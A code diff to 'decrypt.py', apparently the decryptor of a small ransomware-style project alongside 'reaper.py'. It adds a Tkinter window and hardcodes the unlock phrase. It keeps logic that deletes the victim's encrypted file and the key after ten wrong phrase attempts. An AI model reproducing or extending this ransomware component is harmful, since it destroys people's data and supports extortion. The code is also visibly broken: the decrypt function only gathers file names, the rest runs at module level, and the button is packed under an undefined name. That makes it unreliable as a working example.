@@ -6,20 +6,26 @@
 
 import os
 import time
+import tkinter as tk
 from cryptography.fernet import Fernet
 
-# Put here the file name you want do decrypt for example if my text file is named Personal
-files_enc = "Personal"
+
+files_enc = "adou"
 thegoldenkey = "thekey.key"
-i = 0
 y = 10
 files = []
 
-for file in os.listdir():
-	if file == "reaper.py" or file == "thekey.key" or file == "decrypt.py":
-		continue
-	if os.path.isfile(file):
-		files.append(file)
+# GUI Interface
+window = tk.Tk()
+window.title("Decryptor")
+window.geometry("500x300")
+
+def decrypt():
+    for file in os.listdir():
+        if file == "reaper.py" or file == "thekey.key" or file == "decrypt.py":
+            continue
+        if os.path.isfile(file):
+            files.append(file)
 
 print(files)
 
@@ -27,7 +33,7 @@ print(files)
 with open("thekey.key", "rb") as key:
 	secretkey = key.read()
 
-secretphrase = ""
+secretphrase = "adou"
 
 user_phrase = input("Enter the secret phrase to decrypt your files\n")
 
@@ -39,17 +45,16 @@ if user_phrase == secretphrase :
 		with open(file, "wb") as thefile:
 			thefile.write(contents_decrypted)
 		print("Files Decrypted")
-		os.remove(thegoldenkey)
+#		os.remove(thegoldenkey)
 		
 else :
-	print("Wrong Phrase try left : 10")
+	print("Wrong Phrase try left :", y)
 	user_phrase = input("Enter the secret phrase to decrypt your files\n")
-	while i < 9:
-		i += 1
+	while y > 0:
 		y -= 1
 		print("Wrong Phrase, try left :", y)
 		user_phrase = input("Enter the secret phrase to decrypt your files\n")
-		if i == 9:
+		if y == 0:
 			os.remove(files_enc)
 			print("//\\")
 			time.sleep(0.5)
@@ -63,6 +68,12 @@ else :
 			time.sleep(0.5)
 			print("\\//")
 			print("𝙁𝙞𝙡𝙚 𝘿𝙚𝙡𝙚𝙩𝙚𝙙 𝙛𝙤𝙧 𝙨𝙖𝙛𝙚𝙩𝙮")
+			os.remove(thegoldenkey)
 		else:
 	    		pass
+
+	
+decrypt_b = tk.Button(window, text='decrypt', width=200, command=decrypt)
+button.pack(pady=20)
+window.mainloop()
 
